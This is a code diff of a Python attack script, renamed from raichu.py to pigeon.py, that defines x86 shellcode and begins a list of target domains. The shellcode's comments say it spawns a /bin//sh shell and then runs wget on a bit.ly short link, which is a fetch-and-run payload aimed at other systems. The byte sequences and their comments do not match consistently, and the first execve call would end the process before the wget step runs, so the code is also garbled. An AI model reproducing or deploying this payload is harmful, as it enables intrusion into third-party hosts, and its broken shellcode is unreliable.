@@ -1,27 +1,23 @@
-# raichu.py (Updated version of raticate_v2)
+# pigeon.py (Updated version of raticate_v2)
 import socket
 import struct
 
-# Example shellcode to download and execute a wget
+# Example shellcode to download and execute a wget https://bit.ly/3xyzabc
 shellcode = (
     b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"  # Push "/bin//sh" to stack
     b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"              # Execve syscall to spawn a shell
 
-    # Push the URL "https://bit.ly/3xyzabc" in reverse
-    b"\x68\x7a\x61\x62\x63"                      # Push "zabc" (last part of URL)
-    b"\x68\x33\x78\x79\x7a"                      # Push "3xyz"
-    b"\x68\x2e\x6c\x79\x2f"                      # Push ".ly/"
-    b"\x68\x62\x69\x74\x2f"                      # Push "bit/"
-    b"\x68\x73\x3a\x2f\x2f"                      # Push "://"
-    b"\x68\x73\x68\x74\x74"                      # Push "shtt" (first part of "https")
-
-    # Push "wget" command
-    b"\x68\x2f\x77\x67\x65"                      # Push "wget" command
-
-    # Call execve to execute wget https://bit.ly/3xyzabc
-    b"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"          # Execve syscall to execute the command
+    # Pushing "wget http://bit.ly/3xyzabc"
+    b"\x31\xc0\x50\x68\x7a\x61\x62\x63"                      # Push "zabc" (last part of URL)
+    b"\x68\x33\x78\x79\x7a"                                  # Push "3xyz"
+    b"\x68\x2e\x6c\x79\x2f"                                  # Push ".ly/"
+    b"\x68\x62\x69\x74\x2f"                                  # Push "bit/"
+    b"\x68\x73\x3a\x2f\x2f"                                  # Push "://"
+    b"\x68\x68\x74\x74\x70"                                  # Push "http"
+    
+    b"\x89\xe1\x50\x68\x2f\x77\x67\x65"                      # Push "wget" command
+    b"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"                      # Execve syscall to execute the command
 )
-
 
 # List of target domains
 target_domains = [
